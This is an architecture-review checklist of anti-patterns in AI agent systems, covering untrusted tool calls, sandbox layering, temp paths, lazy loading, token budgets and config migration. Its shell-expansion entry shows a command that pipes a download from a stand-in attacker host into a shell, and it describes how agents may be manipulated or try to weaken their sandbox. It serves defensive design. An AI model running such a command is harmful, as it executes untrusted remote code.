# Agent System Anti-Patterns

What production agent systems specifically avoid. Extracted from Claude Code's defensive
coding practices. Use as a checklist during architecture review.

## Critical Anti-Patterns (Security)

### AP-1: Trusted Model Output

**What it looks like:** Executing model-generated tool calls without validation, treating
the model's JSON output as trusted data.

**Why it's dangerous:** The model's tool calls should be treated as untrusted input,
identical to user form data in a web server. Prompt injection can cause the model to
generate malicious tool calls.

**Correct pattern:** Validate all tool inputs against schemas. Apply permission checks.
Run inside sandbox. Treat every tool_use block as potentially adversarial.

### AP-2: Single-Layer Security

**What it looks like:** One permission check between model output and action execution.
"We have a sandbox, so we're secure."

**Why it's dangerous:** Any single layer can be bypassed. The model might find a way
around one check — it should face four independent checks.

**Correct pattern:** Four independent layers: permission system, sandbox, path validation,
environment scrubbing. Each layer operates independently.

### AP-3: Mutable Sandbox Configuration

**What it looks like:** Sandbox config files are writable by sandboxed processes. The
model could potentially modify its own constraints.

**Why it's dangerous:** Self-referential modification. If the sandbox doesn't protect
its own config, the first thing an adversarial agent will do is weaken the sandbox.

**Correct pattern:** Deny-list settings files in sandbox write rules. The sandbox
protects itself from modification.

### AP-4: Predictable Temp Paths

**What it looks like:** Using `/tmp/agent-output/` or similar predictable paths for
extracted files, skill bundles, or intermediate outputs.

**Why it's dangerous:** Symlink attacks, TOCTOU attacks, path traversal from shared
filesystems.

**Correct pattern:** Cryptographic nonce (16 bytes / 32 hex chars) in all temp paths.

### AP-5: Unchecked Shell Expansion

**What it looks like:** Validating a command string, then passing it to a shell that
expands variables, tildes, or other syntax before execution.

**Why it's dangerous:** TOCTOU — the command changes between validation and execution.
`echo hello` validates as safe, but `echo $(curl evil.com | sh)` does not.

**Correct pattern:** Reject all shell expansion syntax ($, %, =, ~user) before execution.
Validate the final form.

## High Anti-Patterns (Cost/Reliability)

### AP-6: Synchronous Module Loading on Startup

**What it looks like:** `import { heavy } from './heavy-module'` at the top of entry files.
All modules loaded before first render.

**Why it's dangerous:** Startup time directly impacts user experience. Claude Code defers
~1.1MB of modules (OpenTelemetry + gRPC) to post-first-render.

**Correct pattern:** Three-tier lazy loading: (1) feature-flag gated (compile-time),
(2) runtime-condition gated, (3) deferred to next tick via setImmediate.

### AP-7: Full Token Recount Every Turn

**What it looks like:** Counting every token in the entire conversation history before
each API call to check context limits.

**Why it's dangerous:** Expensive and unnecessary. The exact count was returned by the
last API response — only new messages need estimation.

**Correct pattern:** Hybrid estimation: exact counts from API response + rough estimates
(~4 chars/token) for new messages.

### AP-8: No Budget Constraint

**What it looks like:** Agent loop with no cost ceiling. The loop runs until the task
is complete or the user cancels.

**Why it's dangerous:** Runaway loops, hallucination spirals, and retry storms can
accumulate significant API costs before anyone notices.

**Correct pattern:** maxBudgetUsd and taskBudget as constructor parameters. Check before
each API call.

### AP-9: Wait-for-Complete Tool Execution

**What it looks like:** Waiting for the full API response to finish streaming before
starting to execute any tool calls.

**Why it's dangerous:** Not a security risk, but a significant latency penalty. The model
often generates multiple tool calls in sequence. Streaming execution starts the first
tool while the model is still generating the second.

**Correct pattern:** StreamingToolExecutor that begins execution on each tool_use block
as it streams in.

## Medium Anti-Patterns (Maintainability)

### AP-10: Over-Engineered State Management

**What it looks like:** Redux, MobX, or complex state management in an agent system.
Global state tree with actions, reducers, middleware.

**Why it's correct to avoid:** Agent loops are inherently sequential. The state is
simple: messages, token count, cost, permissions. A 20-line custom store with Object.is
equality is sufficient.

### AP-11: Dynamic Tool Ordering

**What it looks like:** Tool definitions sent in different orders across API requests.
MCP tools interleaved with built-in tools.

**Why it's costly:** Tool definitions are part of the API cache key. Changing order
invalidates all downstream caches. Built-in tools should be a sorted, contiguous prefix.

### AP-12: No Configuration Migration

**What it looks like:** Breaking changes to config format with no migration path.
Users must manually update config files when the agent upgrades.

**Why it matters:** The database migration pattern applies to CLI/agent config. Version-
tracked migrations that execute sequentially on startup ensure smooth upgrades.